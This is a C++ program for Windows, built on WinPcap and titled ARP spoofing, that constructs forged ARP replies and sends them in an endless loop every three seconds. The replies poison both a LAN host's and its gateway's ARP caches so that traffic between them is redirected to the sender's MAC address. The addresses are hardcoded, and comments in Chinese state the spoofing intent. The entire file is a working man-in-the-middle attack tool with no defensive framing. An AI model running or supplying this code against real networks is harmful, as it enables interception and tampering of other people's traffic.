// ARP欺骗.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "pcap.h"
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib") 
#include "protocol.h"
pcap_t * init()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum = 0;
	int i = 0;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];

	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return 0;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return 0;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	/* Open the device */
	/* Open the adapter */
	if ((adhandle = pcap_open_live(d->name,	// name of the device
		65536,			// portion of the packet to capture. 
		// 65536 grants that the whole packet will be captured on all the MACs.
		1,				// promiscuous mode (nonzero means promiscuous)
		1000,			// read timeout
		errbuf			// error buffer
		)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return 0;
	}

	printf("\nlistening on %s...\n", d->description);

	/* At this point, we don't need any more the device list. Free it */
	pcap_freealldevs(alldevs);

	return adhandle;
}
void ChangeMacAddr(char *p, UCHAR a[])      //把输入的12字节的MAC字符串，转变为6字节的16进制MAC地址
{
	char* p1 = NULL;
	int i = 0;
	int high, low;
	char temp[1];
	for (i = 0; i < 6; i++)
	{
		p1 = p + 1;
		switch (*p1) //计算低位的16进进制
		{
		case 'A': low = 10;        break;
		case 'B': low = 11;        break;
		case 'C': low = 12;        break;
		case 'D': low = 13;        break;
		case 'E': low = 14;        break;
		case 'F': low = 15;        break;
		default: temp[0] = *p1;
			low = atoi(temp); //如果为数字就直接转变成对应的数值
		}

		switch (*p) //计算高位的16进制
		{
		case 'A': high = 10;       break;
		case 'B': high = 11;       break;
		case 'C': high = 12;       break;
		case 'D': high = 13;       break;
		case 'E': high = 14;       break;
		case 'F': high = 15;       break;
		default: temp[0] = *p;
			high = atoi(temp); //如果为数字就直接转变成对应的数值
		}
		p += 2; //指针指向下一个X(高)X(低)字符串

		a[i] = high * 16 + low; //求和得16进制值
	}
}
void makeArpPacket(ARP_PACKET &ARPPacket, char *srcMac, char * srcIP, char *dstMac, char * dstIP){
	UCHAR MacAddr[6] = { 0 };
	//以太网头
	ChangeMacAddr(dstMac, ARPPacket.ehhdr.eh_dst); //目的MAC地址
	ChangeMacAddr(srcMac, ARPPacket.ehhdr.eh_src); //源	 MAC地址
	ARPPacket.ehhdr.eh_type = htons(EPT_ARP);		//数据类型ARP请求或应答
	//ARP头开始
	ARPPacket.arphdr.arp_hrd = htons(ARP_HARDWARE);//硬件地址为0X0001表示以太网址
	ARPPacket.arphdr.arp_pro = htons(EPT_IP);		//协议类型字段为0X0800表示为IP地址
	ARPPacket.arphdr.arp_hln = 6;	//硬件地址长度和协议地址长度分别指出硬件地址和协议地址的长度
	ARPPacket.arphdr.arp_pln = 4;	//以字节为单位。对于以太网上IP地址的ARP请求或应答来说，它们的值分别为6和4。
	ChangeMacAddr(srcMac, ARPPacket.arphdr.arp_sha); //发送方 源MAC地址（欺骗的MAC地址）
	ARPPacket.arphdr.arp_spa = inet_addr(srcIP);     //发送方 源IP地址 （欺骗的MAC地址）
	ChangeMacAddr(dstMac, ARPPacket.arphdr.arp_tha); //目标的MAC地址 
	ARPPacket.arphdr.arp_tpa = inet_addr(dstIP);     //目标的IP地址
}
void sendArpPacket(pcap_t * fp, ARP_PACKET &ARPPacket){
	/* Send down the packet */
	if (pcap_sendpacket(fp,	            // Adapter
		(const u_char *)&ARPPacket,		// buffer with the packet
		sizeof(ARPPacket)		        // size
		) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
		return;
	}

}
int _tmain(int argc, _TCHAR* argv[])
{
	//1.初始化网络环境
	pcap_t * adhandle = init();
	//2.填充数据包
	ARP_PACKET ARPPacket_A = { 0 }; //arp包
	ARP_PACKET ARPPacket_B = { 0 }; //arp包
	//192.168.1.31  (00-0C-29-E9-82-4C)
	// 192.168.1.1 - > 3c-46-d8-df-3a-f0
	// 192.168.1.1 - > DC-53-60-2F-C5-6A
	//                          srcMac,          srcIP,             dstMac,         dstIP
	//                      （欺骗成我的MAC地址）
	makeArpPacket(ARPPacket_A, "4C0BBE017674", "192.168.1.1", "000C29031655", "192.168.1.72");//‎把主机114的arp表改掉了
	makeArpPacket(ARPPacket_B, "4C0BBE017674", "192.168.1.72", "3C46D8DF3AF0", "192.168.1.1");  //‎把交换机 的arp表改掉了
	//192.168.1.72 000C29031655
	//192.168.1.52 4C0BBE017674
	//192.168.1.1  3C46D8DF3AF0
	while (true)
	{
		//3.发送数据包
		sendArpPacket(adhandle, ARPPacket_A);
		sendArpPacket(adhandle, ARPPacket_B);
		printf("send OK ! \n");
		Sleep(3000);
	} 
	pcap_close(adhandle);
	return 0;
}

